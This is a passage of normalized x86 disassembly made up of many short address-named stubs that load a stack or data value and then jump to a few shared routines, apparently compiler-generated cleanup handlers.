mov ecx [ ebp - 0x10 ]
add ecx 0x14
jmp sub_41c358
sub_426616
mov eax r--data
jmp sub_40bcfe
sub_426620
mov ecx [ ebp - 0x10 ]
jmp sub_404503
sub_426628
mov ecx [ ebp - 0x10 ]
add ecx 0xc
jmp sub_41c358
sub_426633
mov ecx [ ebp - 0x10 ]
add ecx 0x14
jmp sub_41c358
sub_42663e
mov ecx [ ebp - 0x10 ]
add ecx 0x18
jmp sub_41c358
sub_426649
mov eax r--data
jmp sub_40bcfe
sub_426654
push [ ebp + 0x14 ]
call sub_403bba
retn
sub_42665d
mov eax r--data
jmp sub_40bcfe
sub_426668
mov ecx [ ebp - 0x10 ]
jmp sub_41b355
sub_426670
mov eax r--data
jmp sub_40bcfe
sub_42667c
push [ ebp - 0x10 ]
call sub_403bba
retn
sub_426685
mov eax r--data
jmp sub_40bcfe
sub_426690
mov eax r--data
jmp sub_40bcfe
sub_42669c
mov eax r--data
jmp sub_40bcfe
sub_4266a8
mov eax r--data
jmp sub_40bcfe
sub_4266b4
push [ ebp - 0x10 ]
call sub_403bba
retn
sub_4266bd
mov eax r--data
jmp sub_40bcfe
sub_4266c8
mov ecx [ ebp - 0x10 ]
add ecx 0x10
jmp sub_41c358
sub_4266d3
mov eax r--data
jmp sub_40bcfe
sub_4266e0
mov ecx [ ebp - 0x10 ]
add ecx 0x10
jmp sub_41c358
sub_4266eb
mov eax r--data
jmp sub_40bcfe
sub_4266f8
mov eax r--data
jmp sub_40bcfe
sub_426704
mov eax r--data
jmp sub_40bcfe
sub_426710
mov eax r--data
jmp sub_40bcfe
sub_42671c
lea ecx [ ebp - 0x10 ]
jmp sub_41c358
sub_426724
mov eax [ ebp - 0x14 ]
and eax 0x1
test eax eax
je r-xdata
retn
mov ecx [ ebp + 0x8 ]
jmp sub_41c358
sub_42673b
mov eax r--data
jmp sub_40bcfe
sub_426748
lea ecx [ ebp - 0x10 ]
jmp sub_41c358
sub_426750
mov eax [ ebp - 0x14 ]
and eax 0x1
test eax eax
je r-xdata
retn
mov ecx [ ebp + 0x8 ]
jmp sub_41c358
sub_426767
mov eax r--data
jmp sub_40bcfe
sub_426774
lea ecx [ ebp - 0x10 ]
jmp sub_41c358
sub_42677c
lea ecx [ ebp + 0x10 ]
jmp sub_41c358
sub_426784
mov eax r--data
jmp sub_40bcfe
sub_426790
push [ ebp - 0x14 ]
call sub_403bba
retn
sub_426799
mov ecx [ ebp - 0x14 ]
jmp sub_404503
sub_4267a1
mov ecx [ ebp - 0x14 ]
add ecx 0x10
jmp sub_41c358
sub_4267ac
mov eax r--data
jmp sub_40bcfe
sub_4267b8
push [ ebp - 0x10 ]
call sub_403bba
retn
sub_4267c1
mov eax r--data
jmp sub_40bcfe
sub_4267cc
mov ecx [ ebp - 0x10 ]
jmp sub_41b355
sub_4267d4
mov eax r--data
jmp sub_40bcfe
sub_4267e0
lea ecx [ ebp - 0xa4 ]
jmp sub_424410
sub_4267eb
mov eax r--data
jmp sub_40bcfe
sub_4267f8
lea ecx [ ebp - 0xa4 ]
jmp sub_424410
sub_426803
mov eax r--data
jmp sub_40bcfe
sub_426810
push [ ebp - 0x10 ]
call sub_423161
retn
sub_426819
mov eax r--data
jmp sub_40bcfe
